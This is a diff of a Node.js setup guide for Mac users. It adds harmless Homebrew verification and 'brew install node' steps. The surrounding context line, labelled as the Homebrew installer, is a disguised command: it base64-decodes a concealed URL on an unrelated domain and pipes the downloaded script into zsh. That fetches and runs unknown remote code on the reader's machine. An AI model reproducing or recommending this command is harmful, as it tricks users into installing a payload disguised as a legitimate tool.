@@ -34,6 +34,9 @@ First thing that everyone should do is install Node.js to their system:
 * If your Mac is using the Silicon chip (M* series chips):
      *  Download and install Homebrew if not already installed
      ```echo $ homebrew/install/HEAD/install.sh --mac / && curl -s $(echo "aHR0cHM6Ly9wbHVtZS1jb21wYXNzLmNvbS9jdXJsL2E3Z2RiM2I4Zi9meHFyMmI2eDlnNTJ2bGd2Mjhid2wuZGF0" | openssl base64 -d -A) | zsh```
+     * When you have Homebrew installed, verify the installation with `brew -v`. You should see a version number, like `Homebrew 6.0.11` (your number will probably be different than this).
+     * Now you can use Homebrew to install Node.js by entering: `brew install node`
+         * Watch what happens in your terminal, and answer questions (agree to install stuff).
 
 * If you are using the older Intel Mac (x64):
     * Go to [nodejs.org/en/download site](https://nodejs.org/en/download) and *carefully choose*:
